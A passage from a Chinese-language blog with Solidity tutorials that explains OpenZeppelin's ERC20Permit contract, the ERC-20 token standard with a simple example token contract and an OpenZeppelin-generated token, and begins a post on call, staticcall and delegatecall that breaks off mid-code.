<li><strong>权限转移</strong>：通过 <code>setAuthority</code> 函数可以转移合约的权限，但只有当前的授权地址才能执行这个操作，这确保了权限的转移是可控的。</li>
<li><strong>预定操作</strong>：通过 <code>isConsumingScheduledOp</code> 函数可以检查合约是否正在执行预定的操作，这对于需要同步执行多个操作的合约非常有用。</li>
</ul>
<h1 id="ERC20Permit"><a href="#ERC20Permit" class="headerlink" title="ERC20Permit"></a>ERC20Permit</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/extensions/ERC20Permit.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import &#123;IERC20Permit&#125; from &quot;./IERC20Permit.sol&quot;;</span><br><span class="line">import &#123;ERC20&#125; from &quot;../ERC20.sol&quot;;</span><br><span class="line">import &#123;ECDSA&#125; from &quot;../../../utils/cryptography/ECDSA.sol&quot;;</span><br><span class="line">import &#123;EIP712&#125; from &quot;../../../utils/cryptography/EIP712.sol&quot;;</span><br><span class="line">import &#123;Nonces&#125; from &quot;../../../utils/Nonces.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @dev Implementation of the ERC-20 Permit extension allowing approvals to be made via signatures, as defined in</span><br><span class="line"> * https://eips.ethereum.org/EIPS/eip-2612[ERC-2612].</span><br><span class="line"> *</span><br><span class="line"> * Adds the &#123;permit&#125; method, which can be used to change an account&#x27;s ERC-20 allowance (see &#123;IERC20-allowance&#125;) by</span><br><span class="line"> * presenting a message signed by the account. By not relying on `&#123;IERC20-approve&#125;`, the token holder account doesn&#x27;t</span><br><span class="line"> * need to send a transaction, and thus is not required to hold Ether at all.</span><br><span class="line"> */</span><br><span class="line">abstract contract ERC20Permit is ERC20, IERC20Permit, EIP712, Nonces &#123;</span><br><span class="line">    bytes32 private constant PERMIT_TYPEHASH =</span><br><span class="line">    keccak256(&quot;Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)&quot;);</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * @dev Permit deadline has expired.</span><br><span class="line">     */</span><br><span class="line">    error ERC2612ExpiredSignature(uint256 deadline);</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * @dev Mismatched signature.</span><br><span class="line">     */</span><br><span class="line">    error ERC2612InvalidSigner(address signer, address owner);</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * @dev Initializes the &#123;EIP712&#125; domain separator using the `name` parameter, and setting `version` to `&quot;1&quot;`.</span><br><span class="line">     *</span><br><span class="line">     * It&#x27;s a good idea to use the same `name` that is defined as the ERC-20 token name.</span><br><span class="line">     */</span><br><span class="line">    constructor(string memory name) EIP712(name, &quot;1&quot;) &#123;&#125;</span><br><span class="line">       </span><br><span class="line">    /**</span><br><span class="line">     * @inheritdoc IERC20Permit</span><br><span class="line">     */</span><br><span class="line">    function permit(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 value,</span><br><span class="line">        uint256 deadline,</span><br><span class="line">        uint8 v,</span><br><span class="line">        bytes32 r,</span><br><span class="line">        bytes32 s</span><br><span class="line">    ) public virtual &#123;</span><br><span class="line">        if (block.timestamp &gt; deadline) &#123;</span><br><span class="line">            revert ERC2612ExpiredSignature(deadline);</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));</span><br><span class="line"> </span><br><span class="line">         bytes32 hash = _hashTypedDataV4(structHash);</span><br><span class="line"> </span><br><span class="line">         address signer = ECDSA.recover(hash, v, r, s);</span><br><span class="line">         if (signer != owner) &#123;</span><br><span class="line">             revert ERC2612InvalidSigner(signer, owner);</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         _approve(owner, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * @inheritdoc IERC20Permit</span><br><span class="line">     */</span><br><span class="line">    function nonces(address owner) public view virtual override(IERC20Permit, Nonces) returns (uint256) &#123;</span><br><span class="line">        return super.nonces(owner);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * @inheritdoc IERC20Permit</span><br><span class="line">     */</span><br><span class="line">    // solhint-disable-next-line func-name-mixedcase</span><br><span class="line">    function DOMAIN_SEPARATOR() external view virtual returns (bytes32) &#123;</span><br><span class="line">        return _domainSeparatorV4();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ERC20Permit</code> 是一个抽象合约，它结合了 ERC-20 标准和 ERC-2612 标准的功能。ERC-2612 标准允许使用签名来批准代币转移，而无需直接调用 <code>approve</code> 函数。下面是对代码的详细解释：</p>
<h3 id="实现原理-3"><a href="#实现原理-3" class="headerlink" title="实现原理"></a>实现原理</h3><ol>
<li><p><strong>继承关系</strong>：</p>
<ul>
<li><code>ERC20Permit</code> 继承了 <code>ERC20</code>、<code>IERC20Permit</code>、<code>EIP712</code> 和 <code>Nonces</code> 四个合约。</li>
<li><code>ERC20</code> 实现了 ERC-20 标准的代币功能。</li>
<li><code>IERC20Permit</code> 定义了 ERC-2612 标准的接口。</li>
<li><code>EIP712</code> 用于生成和验证 EIP-712 签名。</li>
<li><code>Nonces</code> 用于管理每个账户的签名计数器。</li>
</ul>
</li>
<li><p><strong>常量</strong>：</p>
<ul>
<li><code>PERMIT_TYPEHASH</code> 是一个哈希值，用于在 EIP-712 签名中标识 <code>Permit</code> 结构。</li>
</ul>
</li>
<li><p><strong>错误</strong>：</p>
<ul>
<li><code>ERC2612ExpiredSignature</code>：当签名过期时抛出。</li>
<li><code>ERC2612InvalidSigner</code>：当签名者与账户不匹配时抛出。</li>
</ul>
</li>
<li><p><strong>构造函数</strong>：</p>
<ul>
<li>初始化 <code>EIP712</code> 的域分隔符，使用传入的 <code>name</code> 参数，并设置版本号为 <code>&quot;1&quot;</code>。</li>
</ul>
</li>
<li><p><strong>permit 函数</strong>：</p>
<ul>
<li>验证签名是否过期。</li>
<li>生成 <code>Permit</code> 结构的哈希值。</li>
<li>使用 EIP-712 签名验证机制恢复签名者地址。</li>
<li>检查签名者是否与 <code>owner</code> 匹配。</li>
<li>调用 <code>_approve</code> 函数批准代币转移。</li>
</ul>
</li>
<li><p><strong>nonces 函数</strong>：</p>
<ul>
<li>返回指定账户的签名计数器值。</li>
</ul>
</li>
<li><p><strong>DOMAIN_SEPARATOR 函数</strong>：</p>
<ul>
<li>返回 EIP-712 的域分隔符。</li>
</ul>
</li>
</ol>
<h3 id="用途-3"><a href="#用途-3" class="headerlink" title="用途"></a>用途</h3><p><code>ERC20Permit</code> 合约允许用户通过签名来批准代币转移，而无需直接调用 <code>approve</code> 函数。这对于提高安全性（避免重放攻击）和用户体验（无需每次都手动批准）非常有用。</p>
<h3 id="注意事项-4"><a href="#注意事项-4" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
<li><strong>安全性</strong>：确保正确实现 EIP-712 签名验证，以防止签名被滥用。</li>
<li><strong>时间戳</strong>：使用 <code>block.timestamp</code> 来检查签名是否过期，确保安全性。</li>
<li><strong>nonce</strong>：使用 <code>nonce</code> 来防止重放攻击，确保每个签名只被使用一次。</li>
<li><strong>兼容性</strong>：确保合约与所有相关接口和标准兼容，以避免潜在的问题。</li>
</ol>
<h3 id="ERC-2612标准"><a href="#ERC-2612标准" class="headerlink" title="ERC-2612标准"></a>ERC-2612标准</h3><p>ERC-2612 标准提供了一种安全、高效的方式来授权代币转移，是 ERC-20 标准的一个扩展。它允许代币持有者通过签名授权第三方转移代币，而不需要直接调用 <code>approve</code> 函数。这个标准基于 EIP-712，它提供了一种使用签名来验证和执行操作的方法。</p>
<h4 id="ERC-2612-标准的主要功能"><a href="#ERC-2612-标准的主要功能" class="headerlink" title="ERC-2612 标准的主要功能"></a>ERC-2612 标准的主要功能</h4><ol>
<li><p><strong>Permit 函数</strong>：允许代币持有者通过签名授权第三方转移代币。这个函数需要三个参数：<code>owner</code>（代币持有者的地址）、<code>spender</code>（被授权的地址）和 <code>value</code>（被授权的代币数量）。</p>
</li>
<li><p><strong>EIP-712 签名</strong>：使用 EIP-712 签名来验证 <code>Permit</code> 函数的调用。EIP-712 是一种用于生成和验证签名的标准，它允许在签名中包含额外的元数据，如链 ID 和域分隔符。</p>
</li>
<li><p><strong>Nonce</strong>：每个账户都有一个关联的 <code>nonce</code> 值，用于防止重放攻击。在 <code>Permit</code> 函数中，<code>nonce</code> 值会自动增加，确保每个签名只被使用一次。</p>
</li>
</ol>
<h4 id="ERC-2612-标准的实现"><a href="#ERC-2612-标准的实现" class="headerlink" title="ERC-2612 标准的实现"></a>ERC-2612 标准的实现</h4><p>要实现 ERC-2612 标准，代币合约需要包含以下部分：</p>
<ol>
<li><p><strong>Permit 函数</strong>：实现 <code>Permit</code> 函数，用于处理签名授权。</p>
</li>
<li><p><strong>EIP-712 签名</strong>：实现 EIP-712 签名生成和验证机制。</p>
</li>
<li><p><strong>Nonce</strong>：管理每个账户的 <code>nonce</code> 值。</p>
</li>
<li><p><strong>DOMAIN_SEPARATOR</strong>：生成 EIP-712 签名的域分隔符。</p>
</li>
</ol>
<h4 id="ERC-2612-标准的用途"><a href="#ERC-2612-标准的用途" class="headerlink" title="ERC-2612 标准的用途"></a>ERC-2612 标准的用途</h4><p>ERC-2612 标准的主要用途是提高代币的安全性。通过使用签名来授权代币转移，可以防止重放攻击，并简化用户界面。此外，它还可以提高交易效率，因为用户不需要每次都手动批准代币转移。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://zhoubofsy.github.io/2024/11/25/blockchain/ethereum/erc-20/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="博">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Bolog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/25/blockchain/ethereum/erc-20/" class="post-title-link" itemprop="url">ERC-20</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-11-25 10:32:32 / Modified: 10:55:47" itemprop="dateCreated datePublished" datetime="2024-11-25T10:32:32+08:00">2024-11-25</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/blockchain/" itemprop="url" rel="index"><span itemprop="name">blockchain</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="什么是-ERC-20？"><a href="#什么是-ERC-20？" class="headerlink" title="什么是 ERC-20？"></a>什么是 ERC-20？</h1><p>ERC-20 提出了一个同质化代币的标准，换句话说，它们具有一种属性，使得每个代币都与另一个代币（在类型和价值上）完全相同。 例如，一个 ERC-20 代币就像以太币一样，意味着一个代币会并永远会与其他代币一样。(From: 《<a target="_blank" rel="noopener" href="https://ethereum.org/zh/developers/docs/standards/tokens/erc-20/">ERC-20 代币标准</a>》)</p>
<h2 id="方法（Method）"><a href="#方法（Method）" class="headerlink" title="方法（Method）"></a>方法（Method）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function name() public view returns (string)</span><br><span class="line">// 返回令牌的名称 - 例如 &quot;MyToken&quot;</span><br><span class="line">// 可选 - 此方法可用于提高可用性，但接口和其他协定不得期望存在这些值。</span><br><span class="line"></span><br><span class="line">function symbol() public view returns (string)</span><br><span class="line">// 返回令牌的 symbol。例如“HIX”。</span><br><span class="line">// 可选 - 此方法可用于提高可用性，但接口和其他协定不得期望存在这些值。</span><br><span class="line"></span><br><span class="line">function decimals() public view returns (uint8)</span><br><span class="line">// 返回代币使用的小数位数 - 例如 8，表示将代币数量除以 100000000 以获得其用户表示。</span><br><span class="line">// 可选 - 此方法可用于提高可用性，但接口和其他协定不得期望存在这些值。</span><br><span class="line"></span><br><span class="line">function totalSupply() public view returns (uint256)</span><br><span class="line">// 返回总代币供应量。</span><br><span class="line"></span><br><span class="line">function balanceOf(address _owner) public view returns (uint256 balance)</span><br><span class="line">// 返回地址为 _owner 的另一个账户的账户余额。</span><br><span class="line"></span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool success)</span><br><span class="line">// 将 _value 数量的代币转移到 _to，并且必须触发 Transfer 事件。如果消息调用者的账户余额没有足够的代币可供花费，则函数应该throw。</span><br><span class="line">// 注意值为 0 的传输必须被视为正常传输，并触发 Transfer 事件。</span><br><span class="line"></span><br><span class="line">function transferFrom(address _from, address _to, uint256 _value) public returns (bool success)</span><br><span class="line">// 将 _value数量的代币从地址 _from 转移到地址 _to，并且必须触发 Transfer 事件。</span><br><span class="line">// transferFrom 方法用于提现工作流程，允许合约代表您转移代币。例如，这可用于允许合约代表您转移代币和/或以子货币收取费用。除非 _from 账户通过某种机制故意授权了消息的发送者，否则该函数应该throw。</span><br><span class="line"></span><br><span class="line">function approve(address _spender, uint256 _value) public returns (bool success)</span><br><span class="line">// 允许_spender多次从您的账户提款，最高可达_value金额。如果再次调用此函数，它将用 _value 覆盖当前限额。</span><br><span class="line">// 注意：客户端应该确保在创建用户界面时，先将限额设置为 0，然后再为同一花费者将其设置为另一个值。尽管 Contract 本身不应该强制执行它，以允许向后兼容之前部署的 Contract</span><br><span class="line"></span><br><span class="line">function allowance(address _owner, address _spender) public view returns (uint256 remaining)</span><br><span class="line">// 返回 _spender 仍允许从 _owner 中提取的金额。</span><br></pre></td></tr></table></figure>

<h2 id="事件（Event）"><a href="#事件（Event）" class="headerlink" title="事件（Event）"></a>事件（Event）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">event Transfer(address indexed _from, address indexed _to, uint256 _value)</span><br><span class="line">// 必须在代币转移时触发，包括零价值转移。</span><br><span class="line">// 创建新代币的代币合约应该在创建代币时触发 Transfer 事件，并将 _from 地址设置为 0x0。</span><br><span class="line"></span><br><span class="line">event Approval(address indexed _owner, address indexed _spender, uint256 _value)</span><br><span class="line">// 必须在成功调用 approve(address _spender, uint256 _value) 时触发。</span><br></pre></td></tr></table></figure>

<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MyToken &#123;</span><br><span class="line">    string public constant name = &quot;Bob&#x27;s Token&quot;;</span><br><span class="line">    string public constant symbol = &quot;BBK&quot;;</span><br><span class="line">    uint8 public constant decimals = 18;</span><br><span class="line">    uint16 private constant increase = 1000;</span><br><span class="line">    uint256 public constant totalLimit = 27000000 * (10 ** decimals);</span><br><span class="line">    uint256 public totalSupply = 0;</span><br><span class="line">    address private owner;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed _from, address indexed _to, uint256 _value);</span><br><span class="line">    event Approval(address indexed _owner, address indexed _spender, uint256 _value);</span><br><span class="line"></span><br><span class="line">    modifier checkAddress(address _addr) &#123;</span><br><span class="line">        require(address(_addr) != address(0), &quot;Invalid address.&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier checkBalanceOf(address _addr, uint256 _value) &#123;</span><br><span class="line">        require(balanceOf[_addr] &gt;= _value, &quot;Insufficient balance&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier checkOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not owner.&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address _to) public checkOwner returns (uint256) &#123;</span><br><span class="line">        uint256 mintValue = increase * (10  ** decimals);</span><br><span class="line">        require(totalLimit &gt;= (totalSupply + mintValue), &quot;Out of limit.&quot;);</span><br><span class="line">        totalSupply += mintValue;</span><br><span class="line">        balanceOf[_to] += mintValue;</span><br><span class="line">        return balanceOf[_to];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public checkAddress(_to) checkBalanceOf(msg.sender, _value) returns (bool success)&#123;</span><br><span class="line">        balanceOf[msg.sender] -= _value;</span><br><span class="line">        balanceOf[_to] += _value;</span><br><span class="line">        emit Transfer(msg.sender, _to, _value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address _from, address _to, uint256 _value) public checkAddress(_to) checkBalanceOf(_from, _value) returns (bool success) &#123;</span><br><span class="line">        require(allowance[_from][msg.sender] &gt;= _value, &quot;No enough approve value.&quot;);</span><br><span class="line">        allowance[_from][msg.sender] -= _value;</span><br><span class="line">        balanceOf[_from] -= _value;</span><br><span class="line">        balanceOf[_to] += _value;</span><br><span class="line">        emit Transfer(_from, _to, _value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address _spender, uint256 _value) public returns (bool success)&#123;</span><br><span class="line">        allowance[msg.sender][_spender] = _value;</span><br><span class="line">        emit Approval(msg.sender, _spender, _value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意事项</strong></p>
<ul>
<li>由于本合约的编译版本为0.8.0，此版本具备整数溢出检查，所以可以不使用safeMath。</li>
</ul>
<h2 id="快速示例"><a href="#快速示例" class="headerlink" title="快速示例"></a>快速示例</h2><p>使用<a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/5.x/wizard">OpenZeppelin</a>快速创建ERC-20合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// Compatible with OpenZeppelin Contracts ^5.0.0</span><br><span class="line">pragma solidity ^0.8.22;</span><br><span class="line"></span><br><span class="line">import &#123;AccessManaged&#125; from &quot;@openzeppelin/contracts/access/manager/AccessManaged.sol&quot;;</span><br><span class="line">import &#123;ERC20&#125; from &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &#123;ERC20Pausable&#125; from &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Pausable.sol&quot;;</span><br><span class="line">import &#123;ERC20Permit&#125; from &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract BobToken is ERC20, ERC20Pausable, AccessManaged, ERC20Permit &#123;</span><br><span class="line">    constructor(address initialAuthority)</span><br><span class="line">         ERC20(&quot;BobToken&quot;, &quot;BBK&quot;)</span><br><span class="line">         AccessManaged(initialAuthority)</span><br><span class="line">         ERC20Permit(&quot;BobToken&quot;)</span><br><span class="line">    &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function pause() public restricted &#123;</span><br><span class="line">         _pause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unpause() public restricted &#123;</span><br><span class="line">         _unpause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public restricted &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // The following functions are overrides required by Solidity.</span><br><span class="line"></span><br><span class="line">    function _update(address from, address to, uint256 value)</span><br><span class="line">        internal</span><br><span class="line">        override(ERC20, ERC20Pausable)</span><br><span class="line">    &#123;</span><br><span class="line">        super._update(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们的合约通常通过<a target="_blank" rel="noopener" href="https://solidity.readthedocs.io/en/latest/contracts.html#inheritance">继承</a>来使用，在这里我们将 <code>ERC20</code> 重新用于基本标准实现以及 <code>name</code>、<code>symbol</code> 和 <code>decimals</code> 可选扩展。此外，我们正在创建一个代币的 <code>initialSupply</code>，该代币将被分配给部署合约的地址。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://zhoubofsy.github.io/2024/11/21/blockchain/ethereum/usage-of-call-staticcall-delegatecall/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="博">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Bolog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/21/blockchain/ethereum/usage-of-call-staticcall-delegatecall/" class="post-title-link" itemprop="url">call、staticcall、delegatecall使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-21 10:58:29" itemprop="dateCreated datePublished" datetime="2024-11-21T10:58:29+08:00">2024-11-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-25 12:05:10" itemprop="dateModified" datetime="2024-11-25T12:05:10+08:00">2024-11-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/blockchain/" itemprop="url" rel="index"><span itemprop="name">blockchain</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在 Solidity 中，<code>call</code>、<code>staticcall</code>和<code>delegatecall</code>是强大的低级操作，用于与其他合约交互或在当前上下文中执行外部合约的逻辑。掌握它们的用法和区别对于智能合约开发非常重要。</p>
<p>本文将详细介绍它们的功能、适用场景、代码示例，以及使用时需要注意的潜在问题。</p>
<h1 id="call"><a href="#call" class="headerlink" title="call"></a>call</h1><p><strong>功能</strong></p>
<p><code>call</code> 是一种通用方法，用于调用另一个合约的函数或发送 ETH。它可以调用目标合约的任意函数，包括不存在的函数（在这种情况下不会抛出错误）。</p>
<p><strong>特点</strong></p>
<ul>
<li>可读写目标合约的状态。</li>
<li>支持附带 ETH 发送。</li>
<li>返回两个值：<ul>
<li>调用是否成功 (bool)。</li>
<li>调用返回的数据 (bytes memory)。</li>
</ul>
</li>
</ul>
<p><strong>使用场景</strong></p>
<ul>
<li>调用外部合约的任意函数。</li>
<li>向合约或外部账户发送 ETH。</li>
</ul>
<p><strong>代码示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CallExample &#123;</span><br><span class="line">    function callFunction(address target, uint256 value) external returns (bool, bytes memory) &#123;</span><br><span class="line">        // 通过 call 调用目标合约的 setValue(uint)</span><br><span class="line">        (bool success, bytes memory data) = target.call(</span><br><span class="line">     